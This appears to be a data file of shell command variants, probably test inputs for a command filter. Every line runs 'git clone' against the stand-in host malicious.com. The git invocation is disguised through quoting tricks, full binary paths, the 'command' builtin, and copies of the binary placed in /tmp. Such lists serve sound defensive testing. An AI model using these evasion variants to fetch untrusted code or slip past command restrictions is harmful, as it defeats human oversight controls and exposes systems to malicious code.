"git"  clone http://malicious.com/repo.git
"git" clone http://malicious.com/repo.git
"git"clone http://malicious.com/repo.git
'git'  clone http://malicious.com/repo.git
'git' clone http://malicious.com/repo.git
'git'clone http://malicious.com/repo.git
/bin/"git"  clone http://malicious.com/repo.git
/bin/"git" clone http://malicious.com/repo.git
/bin/"git"clone http://malicious.com/repo.git
/bin/'git'  clone http://malicious.com/repo.git
/bin/'git' clone http://malicious.com/repo.git
/bin/'git'clone http://malicious.com/repo.git
/bin/g""it  clone http://malicious.com/repo.git
/bin/g""it clone http://malicious.com/repo.git
/bin/g""itclone http://malicious.com/repo.git
/bin/g''it  clone http://malicious.com/repo.git
/bin/g''it clone http://malicious.com/repo.git
/bin/g''itclone http://malicious.com/repo.git
/bin/git  clone http://malicious.com/repo.git
/bin/git clone http://malicious.com/repo.git
/bin/gitclone http://malicious.com/repo.git
/usr/bin/"git"  clone http://malicious.com/repo.git
/usr/bin/"git" clone http://malicious.com/repo.git
/usr/bin/"git"clone http://malicious.com/repo.git
/usr/bin/'git'  clone http://malicious.com/repo.git
/usr/bin/'git' clone http://malicious.com/repo.git
/usr/bin/'git'clone http://malicious.com/repo.git
/usr/bin/g""it  clone http://malicious.com/repo.git
/usr/bin/g""it clone http://malicious.com/repo.git
/usr/bin/g""itclone http://malicious.com/repo.git
/usr/bin/g''it  clone http://malicious.com/repo.git
/usr/bin/g''it clone http://malicious.com/repo.git
/usr/bin/g''itclone http://malicious.com/repo.git
/usr/bin/git  clone http://malicious.com/repo.git
/usr/bin/git clone http://malicious.com/repo.git
/usr/bin/gitclone http://malicious.com/repo.git
command "git"  clone http://malicious.com/repo.git
command "git" clone http://malicious.com/repo.git
command "git"clone http://malicious.com/repo.git
command 'git'  clone http://malicious.com/repo.git
command 'git' clone http://malicious.com/repo.git
command 'git'clone http://malicious.com/repo.git
command g""it  clone http://malicious.com/repo.git
command g""it clone http://malicious.com/repo.git
command g""itclone http://malicious.com/repo.git
command g''it  clone http://malicious.com/repo.git
command g''it clone http://malicious.com/repo.git
command g''itclone http://malicious.com/repo.git
command git  clone http://malicious.com/repo.git
command git clone http://malicious.com/repo.git
command gitclone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_1 && /tmp/tmp_bin_1 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_10 && /tmp/tmp_bin_10 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_100 && /tmp/tmp_bin_100 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_101 && /tmp/tmp_bin_101 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_102 && /tmp/tmp_bin_102 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_103 && /tmp/tmp_bin_103 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_104 && /tmp/tmp_bin_104 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_105 && /tmp/tmp_bin_105 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_106 && /tmp/tmp_bin_106 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_107 && /tmp/tmp_bin_107 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_108 && /tmp/tmp_bin_108 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_109 && /tmp/tmp_bin_109 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_11 && /tmp/tmp_bin_11 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_110 && /tmp/tmp_bin_110 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_111 && /tmp/tmp_bin_111 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_112 && /tmp/tmp_bin_112 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_113 && /tmp/tmp_bin_113 clone http://malicious.com/repo.git
cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_114 && /tmp/tmp_bin_114 clone http://malicious.com/repo.git
